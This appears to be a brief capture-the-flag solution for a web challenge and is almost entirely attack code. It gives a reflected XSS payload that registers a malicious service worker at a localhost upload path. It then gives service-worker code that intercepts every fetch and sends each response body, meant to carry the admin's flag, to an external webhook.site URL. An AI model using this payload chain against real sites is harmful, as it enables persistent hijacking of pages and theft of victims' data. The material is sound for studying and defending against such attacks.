# XSS
Use the reflected xss in /play to run a script that add a service worker shared with the admin
```
<script>
navigator.serviceWorker.register('http://localhost:5000/upload/2b56cf292bf342528333e58500f365bc');
window.setTimeout(()=>document.location = 'http://localhost:5000/upload/ffffffffffffffffffffffffffffffff',500);
</script>
```

# Service worker

Example of service worker to get the flag

```
self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.match(e.request).then((r) => {
      return r || fetch(e.request).then((response) => {

        console.log(response);
        console.log(new Map(response.headers));

        const newHeaders = new Headers();

        const anotherResponse = new Response(response.body, {
          status: response.status,
          statusText: response.statusText,
          headers: newHeaders
        });


        clone = anotherResponse.clone()
        clone.text().then((x)=>fetch('https://webhook.site/658ad3a1-05d6-4e79-a8e8-15a46d2caf40/'+x).then((r)=>console.log(r)));


        console.log(new Map(anotherResponse.headers));


        return caches.open('static').then(
          (cache) => {
            cache.put(e.request,
              anotherResponse.clone());
            return anotherResponse;
          }
        );
      });
    })
  );
});

```